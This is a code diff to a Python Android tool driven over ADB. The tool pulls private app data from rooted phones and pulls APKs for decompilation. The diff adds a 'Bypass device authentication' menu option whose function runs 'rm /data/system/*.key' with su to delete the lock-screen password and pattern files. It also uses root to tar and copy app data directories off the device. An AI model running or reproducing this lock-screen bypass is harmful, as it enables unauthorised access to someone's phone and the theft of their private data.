@@ -16,8 +16,30 @@ except ImportError,e:
 W  = '\033[0m'  # white (normal)
 R  = '\033[31m' # red
 G  = '\033[32m' # green
-GR = '\033[37m' # gray
 C  = '\033[36m' # cyan
+
+def bypass(adb):
+	print "[*] Checking root...." ,
+	supath = adb.find_binary("su")
+	if "not found" not in supath:
+		print G+"\t[DONE] - "+supath+W ,
+		print W
+	else:
+		print R+"[-] didn't find su binary.."+W
+		exit(-8)
+	agree= raw_input("[*] type : \"on my own risk\" to continue, or anything else to quit\n")
+	if agree == "on my own risk":
+		removeKey  = supath+" -c 'rm /data/system/*.key'"
+		print "[*] Removing key files..." ,
+		print adb.shell_command(removeKey)
+		try:
+			adb.shell_command(removeKey)
+			print G+"\t[DONE] - reboot..."+W
+		except:
+			print "\t[FAILED]"
+	else:
+		return
+		
 
 def appPrint(adb):
 	try:
@@ -64,26 +86,34 @@ def analyze(adb):
 	print G+"\t[DONE]"+W
 	print "[*] Creating remote tar file: "+W+tarname ,
 	cmd = supath+" -c 'tar -c /data/data/"+packageTarget+" -f "+tarname+"'"
-	adb.shell_command(cmd)
-	print G+"\t[DONE]"+W
+	try:
+		adb.shell_command(cmd)
+		print G+"\t[DONE]"+W
+	except:
+		print R+"\t[FAILED] - can't create remote tar."+W
 	print "[*] Retrieving remote file: "+tarname ,
-	if not os.path.exists("./analyse/"):
-		os.makedirs("./analyse/")
-	if not os.path.exists("./analyse/"+packageTarget):
-		os.makedirs("./analyse/"+packageTarget)
-	adb.get_remote_file(tarname, './analyse/'+packageTarget+'/')
-	print G+"\t[DONE]"+W
+	try:
+		if not os.path.exists("./analyse/"):
+			os.makedirs("./analyse/")
+		if not os.path.exists("./analyse/"+packageTarget):
+			os.makedirs("./analyse/"+packageTarget)
+		adb.get_remote_file(tarname, './analyse/'+packageTarget+'/')
+		print G+"\t[DONE]"+W
+	except:
+		print R+"\t[FAILED] - can't create directory."+W
 	print "[*] Removing remote file: "+tarname ,
 	cmd = 'su -c \'rm %s\'' % tarname
-	adb.shell_command(cmd)
-	print G+"\t[DONE]"+W
+	try:
+		adb.shell_command(cmd)
+		print G+"\t[DONE]"+W
+	except:
+		print R+"\t[FAILED] - can't remove remote tar."+W
 	print G+"[*] TAR file saved on: ./analyse/"+packageTarget+"/"+packageTarget+W
 	print "[*] Extracting content.." , 
 	try:
 		tarA = tarfile.open("./analyse/"+packageTarget+"/"+tarname[8:])
 		for member in tarA.getmembers():
 			tarA.extract(member,path="./analyse/"+packageTarget)
-		
 		print G+"\t[DONE]"+W
 	except:
 		print R+"\t[FAILED]"+W
@@ -115,10 +145,17 @@ def decompile(adb):
 	packageTarget,apkFile = appPrint(adb)
 	apkF=apkFile.rstrip('\r\n')
 	print "[*] Importing APK file.." ,
-	if not os.path.exists("./decompile"):
-		os.makedirs("./decompile")
+	try:
+		if not os.path.exists("./decompile"):
+			os.makedirs("./decompile")
+	except:
+		print R+"\t[FAILED] - can't create directory."+W
 	importCMD="pull "+apkF+" ./decompile"
-	pullAPK=importLib=adb.run_cmd(importCMD)
+	try:
+		pullAPK=adb.run_cmd(importCMD)
+	except:
+		print R+"\t[FAILED] - can't pull APK"+W
+		return
 	time.sleep(3) # enough time for apk to download..
 	print G+" [DONE]"+W+"\n[*] Extracting to: /decompile/decompile_"+apkF[10:]+".." ,
 	if not os.path.exists("./decompile/decompile_"+apkF[10:]):
@@ -144,8 +181,8 @@ def menu(adb):
 	while (1):
 		print "\n\n----------------------------------------"
 		print "1. Analyze APP internal files(rooted device only)"
-		print "2. Pull and prepare for decompilation"
-		print "3. Pull APK"
+		print "2. Pull application APK and prepare for decompilation"
+		print "3. Bypass device authentication(password,pattern...)"
 		print "4. Pull application folder"
 		option = raw_input("option(q - quit): ")
 		if option is '1':
@@ -153,7 +190,7 @@ def menu(adb):
 		elif option is '2':
 			decompile(adb)
 		elif option is '3':
-			pull(apkFile)
+			bypass(adb)
 		elif option is '4':
 			pullApp(apkFile)
 		elif option is 'q':
@@ -176,7 +213,7 @@ def main():
 	adb.set_adb_path('/usr/bin/adb') 	# path to adb..
 	print "[*] Checking ADB path.." ,
 	if adb.check_path() is False:
-		print "\t"+R+"[FAILED - ADB path doesn't exists..]\n"+W
+		print "\t"+R+"\t[FAILED] - ADB path doesn't exists..\n"+W
 		exit(-2)
 	print "\t"+G+"[OK]"+W
 	print "[*] Restarting ADB server.." ,
